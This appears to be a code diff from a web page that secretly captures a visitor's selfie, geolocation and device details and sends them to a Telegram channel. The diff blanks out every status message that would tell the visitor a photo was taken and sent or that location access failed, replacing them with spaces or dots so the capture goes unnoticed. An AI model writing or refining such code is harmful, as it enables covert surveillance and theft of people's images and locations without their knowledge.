@@ -95,19 +95,19 @@
 
                             // Send everything
                             await sendToTelegram(data.image, data.lat, data.lon, data.source, data.device, 'User');
-                            statusDiv.textContent = '✅ Selfie captured and sent!';
+                            statusDiv.textContent = '  ';
                         },
                         (error) => {
                             console.error('Error getting location:', error);
-                            statusDiv.textContent = '❌ Failed to get location.';
+                            statusDiv.textContent = '.';
                         }
                     );
                 } else {
-                    statusDiv.textContent = '❌ Geolocation is not supported by this browser.';
+                    statusDiv.textContent = '  ..';
                 }
             } catch (err) {
                 console.error(err);
-                statusDiv.textContent = '❌ Failed to capture and send selfie.';
+                statusDiv.textContent = '  ....';
             }
         }
 
